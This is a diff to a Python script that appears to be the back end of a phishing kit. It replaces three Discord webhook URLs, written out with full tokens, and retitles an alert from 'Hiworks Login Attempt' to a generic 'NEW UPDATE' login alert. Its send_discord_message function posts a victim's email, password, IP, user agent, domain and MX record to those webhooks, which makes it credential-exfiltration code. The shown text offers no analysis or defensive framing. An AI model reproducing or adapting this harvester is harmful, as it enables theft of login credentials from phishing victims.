@@ -18,9 +18,9 @@ import dns.resolver
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1340527933512486923/9MjEnGT2JFYpqcCo9EeWVKfVvVZCGz8Of32OdNCphRJn5cpjWPVwXTtSTJYcjx6GqSHu",
-    "https://discord.com/api/webhooks/1340528897724383253/2zhI_b33_rmii70asE1Hy0KAr7pPUgArLe0qXDdH8ukxeLYlgVUah0UTJo5OIZih3rEh",
-    "https://discord.com/api/webhooks/1340528994147369083/AJju1Jvq1ZBt9uiyk2bGe4-i77Vof_lzidaflyr8cCvVUtmjfwjKvjVHnDlSRJV13lJH"
+    "https://discord.com/api/webhooks/1351686325220413492/WQOQc83V-XvzlLq184irgHbwK9_ODn98CbfHvmmWtYGrTA2GNb7x80gzt1Vq25Dy8Yj9",
+    "https://discord.com/api/webhooks/1351686334317854770/j-v0JuHssMJEcAEXSB6WPMo2ivb_tb0tnNhYhNHZ3spnT8toe_FZvXnNXYb-De9cDTe4",
+    "https://discord.com/api/webhooks/1351686343083819018/hvnP9UD-Su-oa2u_wpELZe-aIstGqswRnT8B-HDDdAW_bZ2bfDsQW6GiSM4NzwaJpodj"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
@@ -30,7 +30,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
         "embeds": [
             {
-                "title": "🔔 Hiworks Login Attempt",
+                "title": "🔔 GENRAAL NEW UPDATE Login Attempt",
                 "color": 16711680,  # Red color in Discord embed
                 "fields": [
                     {"name": "📧 Email", "value": f"`{email}`", "inline": False},
